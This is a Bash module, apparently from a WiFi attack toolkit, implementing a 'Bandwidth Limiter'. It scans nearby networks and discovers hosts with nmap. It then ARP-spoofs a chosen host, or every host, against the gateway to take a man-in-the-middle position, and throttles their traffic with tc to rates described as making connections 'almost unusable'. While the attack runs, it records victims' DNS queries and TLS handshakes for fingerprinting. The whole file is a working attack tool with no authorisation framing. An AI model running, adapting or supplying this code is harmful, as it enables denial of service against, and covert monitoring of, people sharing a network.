#!/bin/bash

_throttle_cleanup() {
    echo
    echo -e "${BOLD_CYAN}[+]${NC} Removing traffic shaping rules..."
    tc qdisc del dev "$iface" root 2>/dev/null

    echo -e "${BOLD_CYAN}[+]${NC} Stopping ARP spoof..."
    pkill -f "arpspoof -i $iface" 2>/dev/null
    sleep 1

    echo -e "${BOLD_CYAN}[+]${NC} Disabling IP forwarding..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
}

throttle_client() {

# mode: "single" = skip all-hosts option, "all" = skip picker go straight to all, default = show picker
local mode="${1:-pick}"

# Dependency check
if ! command -v arpspoof &>/dev/null; then
    echo -e "${BOLD_RED}[!]${NC} arpspoof not found."
    echo -e "    ${DIM}Install with: apt install dsniff${NC}"
    pause
    return
fi

if [[ -z "$iface" ]]; then
    select_interface
    [[ -z "$iface" ]] && return
fi

# ── Network selection ─────────────────────────────────────────────────────
# Scan visible WiFi networks, let the user pick one and connect before
# proceeding so they explicitly choose which subnet to target.
clear
echo -e "${BOLD_CYAN}========== Bandwidth Limiter ==========${NC}"
echo
echo -e "${BOLD_CYAN}[+]${NC} Scanning visible networks on ${BOLD_GREEN}${iface}${NC}..."
echo

# nmcli -t gives colon-separated: SSID:SIGNAL:IN-USE (* when active)
local _raw_nets
_raw_nets=$(nmcli -t -f SSID,SIGNAL,IN-USE dev wifi list ifname "$iface" 2>/dev/null \
    | awk -F: 'NF>=2 && $1!=""' \
    | sort -t: -k2 -rn)

if [[ -z "$_raw_nets" ]]; then
    echo -e "${BOLD_YELLOW}[!]${NC} Could not scan — proceeding with current connection."
    echo
else
    # Build arrays for interactive selector
    local _net_lines=() _net_ssids=() _net_actives=()
    local _current_idx=0 _idx=0

    while IFS=: read -r _s _sig _active; do
        local _ind _sc
        [[ "$_active" == "*" ]] && _ind="${BOLD_GREEN}◉${NC}" || _ind="${DIM}○${NC}"
        if (( _sig+0 >= 70 )); then _sc="$BOLD_GREEN"
        elif (( _sig+0 >= 45 )); then _sc="$BOLD_YELLOW"
        else _sc="$BOLD_RED"; fi
        _net_lines+=("$(printf "%b %-32s %b%3s%%%b" "$_ind" "$_s" "$_sc" "$_sig" "$NC")")
        _net_ssids+=("$_s")
        _net_actives+=("$_active")
        [[ "$_active" == "*" ]] && _current_idx=$_idx
        (( _idx++ )) || true
    done <<< "$_raw_nets"

    local _sel=$_current_idx
    local _ncount=${#_net_lines[@]}

    _render_nets() {
        local _j
        for (( _j=0; _j<_ncount; _j++ )); do
            if (( _j == _sel )); then
                printf "  ${BOLD_CYAN}❯${NC} %b\n" "${_net_lines[$_j]}"
            else
                printf "    %b\n" "${_net_lines[$_j]}"
            fi
        done
    }

    echo -e "  ${DIM}↑↓ to move  Enter to confirm${NC}"
    echo
    tput civis 2>/dev/null
    _render_nets

    while true; do
        local _k _k2
        IFS= read -rsn1 _k
        if [[ "$_k" == $'\x1b' ]]; then
            IFS= read -rsn2 _k2
            case "$_k2" in
                '[A') (( _sel > 0 )) && (( _sel-- )) || true ;;
                '[B') (( _sel < _ncount - 1 )) && (( _sel++ )) || true ;;
            esac
            tput cuu "$_ncount" 2>/dev/null
            _render_nets
        elif [[ -z "$_k" ]]; then
            break
        fi
    done

    tput cnorm 2>/dev/null
    echo

    local _chosen_ssid="${_net_ssids[$_sel]}"
    local _chosen_active="${_net_actives[$_sel]}"

    if [[ "$_chosen_active" == "*" ]]; then
        echo -e "${BOLD_GREEN}[+]${NC} Already connected to ${BOLD_GREEN}${_chosen_ssid}${NC}"
    else
        echo -e "${BOLD_CYAN}[+]${NC} Connecting to ${BOLD_GREEN}${_chosen_ssid}${NC}..."
        local _ok=false

        # Try saved/known connection first (no password needed)
        if nmcli -t -f NAME con show 2>/dev/null | grep -qxF "$_chosen_ssid"; then
            nmcli con up "$_chosen_ssid" ifname "$iface" &>/dev/null \
                && _ok=true
        fi

        # If no saved profile, ask for password
        if ! $_ok; then
            tput cnorm 2>/dev/null
            read -p "  Password: " -s _pass; echo
            nmcli dev wifi connect "$_chosen_ssid" \
                password "$_pass" ifname "$iface" &>/dev/null \
                && _ok=true
        fi

        if ! $_ok; then
            echo -e "${BOLD_RED}[!]${NC} Failed to connect to ${BOLD_GREEN}${_chosen_ssid}${NC}."
            pause; return
        fi

        # Wait up to 15 s for DHCP
        echo -e "${BOLD_CYAN}[+]${NC} Waiting for IP address..."
        local _w=0
        while [[ -z "$(ip -4 addr show "$iface" 2>/dev/null \
                      | awk '/inet /{print $2}')" ]]; do
            sleep 1; (( _w++ )) || true
            (( _w >= 15 )) && break
        done
    fi
    echo -e "${BOLD_GREEN}[+]${NC} Targeting ${BOLD_GREEN}${_chosen_ssid}${NC}"
    echo
fi

# ── Validate IP + gateway (after potential network switch) ─────────────────
local our_ip
our_ip=$(ip -4 addr show "$iface" 2>/dev/null \
    | awk '/inet /{print $2}' | cut -d'/' -f1 | head -n1)

if [[ -z "$our_ip" ]]; then
    echo -e "${BOLD_RED}[!]${NC} ${BOLD_GREEN}${iface}${NC} has no IP — connect to a network first."
    pause; return
fi

local gateway
gateway=$(ip route show dev "$iface" 2>/dev/null | awk '/default/{print $3}' | head -n1)

if [[ -z "$gateway" ]]; then
    echo -e "${BOLD_RED}[!]${NC} Could not determine gateway for ${BOLD_GREEN}${iface}${NC}."
    pause; return
fi

local subnet
subnet=$(ip -o -f inet addr show "$iface" 2>/dev/null | awk '{print $4}' | head -n1)

local _ssid
_ssid=$(nmcli -t -f active,ssid dev wifi 2>/dev/null | awk -F: '/^\*:/{print $2; exit}')
[[ -z "$_ssid" ]] && _ssid=$(iwconfig "$iface" 2>/dev/null | awk -F'"' '/ESSID/{print $2}')
[[ -z "$_ssid" ]] && _ssid="(unknown)"
echo -e "  ${DIM}Network :${NC} ${BOLD_GREEN}${_ssid}${NC}"
echo -e "  ${DIM}Subnet  :${NC} ${BOLD_GREEN}${subnet:-unknown}${NC}"
echo -e "  ${DIM}Gateway :${NC} ${BOLD_GREEN}${gateway}${NC}"
echo -e "  ${DIM}Via     :${NC} ${BOLD_GREEN}${iface}${NC} ${DIM}(${our_ip})${NC}"
echo

# ── Discover hosts ────────────────────────────────────────────────────────
echo -e "${BOLD_CYAN}[+]${NC} Scanning for hosts on ${BOLD_GREEN}${subnet}${NC}..."
echo

local hosts
hosts=$(nmap -sn -T4 "$subnet" 2>/dev/null \
    | awk '/Nmap scan report/{ip=$NF; gsub(/[()]/, "", ip)} /MAC Address/{mac=$3; print ip, mac}' \
    | grep -v "$our_ip")

if [[ -z "$hosts" ]]; then
    echo -e "${BOLD_YELLOW}[!]${NC} No hosts found on the network."
    pause
    return
fi

local host_count
host_count=$(echo "$hosts" | wc -l)

local target_choice=""
if [[ "$mode" != "all" ]]; then
    clear
    echo -e "${BOLD_CYAN}Select target to throttle:${NC}"
    echo
    echo "$hosts" | nl -w2 -s') '
    echo
    [[ "$mode" == "pick" ]] && echo -e "  ${BOLD_YELLOW}$((host_count + 1)))${NC} ALL hosts"
    echo
    read -p "  Choice: " target_choice
fi

local target_ip=""
local target_all=false

if [[ "$mode" == "all" ]]; then
    target_all=true
elif [[ "$mode" == "single" ]]; then
    target_ip=$(echo "$hosts" | sed -n "${target_choice}p" | awk '{print $1}')
    if [[ -z "$target_ip" ]]; then
        echo -e "${BOLD_RED}[!]${NC} Invalid selection."
        pause
        return
    fi
elif [[ "$target_choice" == "$((host_count + 1))" ]]; then
    target_all=true
else
    target_ip=$(echo "$hosts" | sed -n "${target_choice}p" | awk '{print $1}')
    if [[ -z "$target_ip" ]]; then
        echo -e "${BOLD_RED}[!]${NC} Invalid selection."
        pause
        return
    fi
fi

# Pick throttle level
echo
echo -e "${BOLD_CYAN}Throttle level:${NC}"
echo -e "  ${BOLD_CYAN}[1]${NC} Slow    ${DIM}(512 KB/s — streams will buffer)${NC}"
echo -e "  ${BOLD_CYAN}[2]${NC} Painful ${DIM}(128 KB/s — pages load slow)${NC}"
echo -e "  ${BOLD_CYAN}[3]${NC} Crawl   ${DIM}(32 KB/s  — almost unusable)${NC}"
echo -e "  ${BOLD_CYAN}[4]${NC} Custom  ${DIM}(enter KB/s manually)${NC}"
echo
read -p "  Choice [default: 2]: " level_choice

local rate_kbit rate_label
case "$level_choice" in
    1)
        rate_kbit=4096
        rate_label="512 KB/s"
        ;;
    3)
        rate_kbit=256
        rate_label="32 KB/s"
        ;;
    4)
        read -p "  Enter rate in KB/s: " custom_kbs
        if ! [[ "$custom_kbs" =~ ^[0-9]+$ ]] || (( custom_kbs < 1 )); then
            echo -e "${BOLD_RED}[!]${NC} Invalid rate."
            pause
            return
        fi
        rate_kbit=$(( custom_kbs * 8 ))
        rate_label="${custom_kbs} KB/s"
        ;;
    *)
        rate_kbit=1024
        rate_label="128 KB/s"
        ;;
esac

# Confirm
echo
if $target_all; then
    echo -e "${BOLD_RED}[!]${NC} This will throttle ${BOLD_RED}ALL${NC} hosts on the network to ${BOLD_GREEN}${rate_label}${NC}."
else
    echo -e "${BOLD_RED}[!]${NC} This will throttle ${BOLD_GREEN}${target_ip}${NC} to ${BOLD_GREEN}${rate_label}${NC}."
fi
echo -e "    ${DIM}Gateway : ${gateway}${NC}"
echo -e "    ${DIM}Via     : ${iface} (${our_ip})${NC}"
echo
read -p "  Confirm? [y/N] " confirm
[[ "$confirm" =~ ^[Yy]$ ]] || return

# Temp files for background analysis
local _core_dir
_core_dir="$(dirname "${BASH_SOURCE[0]}")"
local _dns_pcap="/tmp/wificli_dns_$$.pcap"
local _ja3_pcap="/tmp/wificli_ja3_$$.pcap"
local _live_log="/tmp/wificli_live_$$.txt"
local _dns_pid="" _ja3_pid="" _live_pid=""
touch "$_live_log"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ── HTB root qdisc ────────────────────────────────────────────────────────
# Classful shaping — unmatched traffic falls into class 1:9999 (full speed)
# so ARP spoof packets, our own connections, and DNS all pass through freely.
# Each target gets its own class with a hard ceil + SFQ leaf for fair TCP flow
# distribution within the throttled budget.
tc qdisc del dev "$iface" root 2>/dev/null
tc qdisc add dev "$iface" root handle 1: htb default 9999
tc class add dev "$iface" parent 1: classid 1:9999 htb rate 1000mbit burst 100k
tc qdisc add dev "$iface" parent 1:9999 handle 9999: sfq perturb 10

# Per-target class counter — each host gets class 1:N, handle N:, filters on src+dst
local _class_id=10

# Start ARP spoofing and install per-IP HTB classes
clear
echo -e "${BOLD_RED}╔══════════════════════════════════════════╗${NC}"
echo -e "${BOLD_RED}║        BANDWIDTH LIMITER ACTIVE          ║${NC}"
echo -e "${BOLD_RED}╚══════════════════════════════════════════╝${NC}"
echo

if $target_all; then
    echo -e "  ${DIM}Rate    :${NC} ${BOLD_GREEN}${rate_label}${NC} ${DIM}per host${NC}"
    echo -e "  ${DIM}Gateway :${NC} ${BOLD_GREEN}${gateway}${NC}"
    echo -e "  ${DIM}Via     :${NC} ${BOLD_GREEN}${iface}${NC} ${DIM}(${our_ip})${NC}"
    echo
    echo -e "${BOLD_RED}  Targets:${NC}"
    echo
    while IFS=' ' read -r ip _; do
        # HTB class: hard rate ceil — no borrowing allowed
        tc class add dev "$iface" parent 1: classid "1:${_class_id}" \
            htb rate "${rate_kbit}kbit" ceil "${rate_kbit}kbit" burst 8k
        # SFQ leaf: fair queuing across this host's TCP/UDP flows
        tc qdisc add dev "$iface" parent "1:${_class_id}" handle "${_class_id}:" \
            sfq perturb 10
        # u32 filters: steer both directions of target traffic into this class
        tc filter add dev "$iface" parent 1: protocol ip prio 1 u32 \
            match ip dst "${ip}/32" flowid "1:${_class_id}"
        tc filter add dev "$iface" parent 1: protocol ip prio 1 u32 \
            match ip src "${ip}/32" flowid "1:${_class_id}"
        # ARP spoof for MITM positioning
        arpspoof -i "$iface" -t "$ip"      "$gateway" &>/dev/null &
        arpspoof -i "$iface" -t "$gateway" "$ip"      &>/dev/null &
        echo -e "  ${BOLD_RED}▶${NC} ${BOLD_YELLOW}${ip}${NC}  ${DIM}→  ${BOLD_GREEN}${rate_label}${NC} ${DIM}[htb 1:${_class_id} + sfq]${NC}"
        (( _class_id++ )) || true
    done <<< "$hosts"
else
    # Single target
    tc class add dev "$iface" parent 1: classid "1:${_class_id}" \
        htb rate "${rate_kbit}kbit" ceil "${rate_kbit}kbit" burst 8k
    tc qdisc add dev "$iface" parent "1:${_class_id}" handle "${_class_id}:" \
        sfq perturb 10
    tc filter add dev "$iface" parent 1: protocol ip prio 1 u32 \
        match ip dst "${target_ip}/32" flowid "1:${_class_id}"
    tc filter add dev "$iface" parent 1: protocol ip prio 1 u32 \
        match ip src "${target_ip}/32" flowid "1:${_class_id}"
    arpspoof -i "$iface" -t "$target_ip"  "$gateway" &>/dev/null &
    arpspoof -i "$iface" -t "$gateway"   "$target_ip" &>/dev/null &
    echo -e "  ${DIM}Target  :${NC} ${BOLD_GREEN}${target_ip}${NC}"
    echo -e "  ${DIM}Rate    :${NC} ${BOLD_GREEN}${rate_label}${NC} ${DIM}[htb 1:${_class_id} + sfq]${NC}"
    echo -e "  ${DIM}Gateway :${NC} ${BOLD_GREEN}${gateway}${NC}"
    echo -e "  ${DIM}Via     :${NC} ${BOLD_GREEN}${iface}${NC} ${DIM}(${our_ip})${NC}"
fi

# Start background DNS capture
if command -v tcpdump &>/dev/null; then
    tcpdump -i "$iface" -w "$_dns_pcap" port 53 &>/dev/null &
    _dns_pid=$!
    echo -e "${BOLD_CYAN}[+]${NC} ${DIM}DNS capture started${NC}"
fi

# Start background TLS capture for JA3 analysis
if [[ -x "${_core_dir}/ja3.sh" ]] && command -v tcpdump &>/dev/null; then
    tcpdump -i "$iface" -w "$_ja3_pcap" \
        "tcp port 443 or tcp port 8443 or tcp port 5228" &>/dev/null &
    _ja3_pid=$!
    echo -e "${BOLD_CYAN}[+]${NC} ${DIM}TLS capture started${NC}"
fi

# Live DNS query logger — writes tab-separated ts/src/domain lines to $_live_log
# Uses awk with date|getline so it works on both mawk and gawk
tcpdump -i "$iface" -n -l -q "port 53" 2>/dev/null | \
    awk '/A\?/ {
        "date +%H:%M:%S" | getline ts; close("date +%H:%M:%S")
        n = split($3, a, "."); ip = a[1]"."a[2]"."a[3]"."a[4]
        dom = $NF; gsub(/[.?]$/, "", dom)
        if (dom != "" && dom !~ /^[0-9]+$/) {
            printf "%s\t%s\t%s\n", ts, ip, dom; fflush()
        }
    }' >> "$_live_log" &
_live_pid=$!

# ── Live display loop ─────────────────────────────────────────────────────
echo
echo -e "${BOLD_CYAN}  ── Live DNS Activity ──────────────────────────────────────${NC}"
echo -e "  ${DIM}TIME      SOURCE IP         DOMAIN${NC}"
echo -e "  ${DIM}────────  ────────────────  ──────────────────────────────────${NC}"
echo

local _shown=0 _iter=0
while true; do
    # Print any new DNS entries since last check
    local _total
    _total=$(wc -l < "$_live_log" 2>/dev/null || echo 0)
    if (( _total > _shown )); then
        tail -n $(( _total - _shown )) "$_live_log" | \
        while IFS=$'\t' read -r _ts _src _dom; do
            printf "  ${DIM}[%s]${NC}  ${BOLD_YELLOW}%-16s${NC}  ${BOLD_CYAN}%s${NC}\n" \
                "$_ts" "$_src" "$_dom"
        done
        _shown=$_total
    fi

    # Print tc per-class stats every 8 seconds
    (( _iter++ )) || true
    if (( _iter % 8 == 0 )); then
        echo
        echo -e "  ${DIM}── Traffic stats ───────────────────────────────────────${NC}"
        tc -s class show dev "$iface" 2>/dev/null | \
            awk '/class htb/ && $3!="1:9999" { cls=$3 }
                 cls && /Sent/ {
                     kb = int($2 / 1024)
                     printf "  \033[2m%-12s\033[0m  \033[1;32m%d KB\033[0m sent  \033[2m%s pkts\033[0m\n", cls, kb, $4
                     cls=""
                 }'
        echo
    fi

    # Check for Enter (1-second timeout per iteration)
    if read -t 1 -s -r _; then
        break
    fi
done

# Stop background captures and live logger
[[ -n "$_live_pid" ]] && kill "$_live_pid" 2>/dev/null; wait "$_live_pid" 2>/dev/null || true
[[ -n "$_dns_pid"  ]] && kill "$_dns_pid"  2>/dev/null; wait "$_dns_pid"  2>/dev/null || true
[[ -n "$_ja3_pid"  ]] && kill "$_ja3_pid"  2>/dev/null; wait "$_ja3_pid"  2>/dev/null || true
rm -f "$_live_log" 2>/dev/null

_throttle_cleanup

# Display DNS intelligence summary
if [[ -x "${_core_dir}/dns.sh" && -f "$_dns_pcap" ]] && \
   tcpdump -r "$_dns_pcap" -c 1 &>/dev/null 2>&1; then
    echo
    echo -e "${BOLD_CYAN}========== DNS Intelligence ==========${NC}"
    bash "${_core_dir}/dns.sh" -f "$_dns_pcap"
fi

# Display JA3 TLS fingerprint summary
if [[ -x "${_core_dir}/ja3.sh" && -f "$_ja3_pcap" ]] && \
   tcpdump -r "$_ja3_pcap" -c 1 &>/dev/null 2>&1; then
    echo
    echo -e "${BOLD_CYAN}========== TLS Fingerprints (JA3) ==========${NC}"
    bash "${_core_dir}/ja3.sh" -f "$_ja3_pcap"
fi

rm -f "$_dns_pcap" "$_ja3_pcap" 2>/dev/null

pause
}
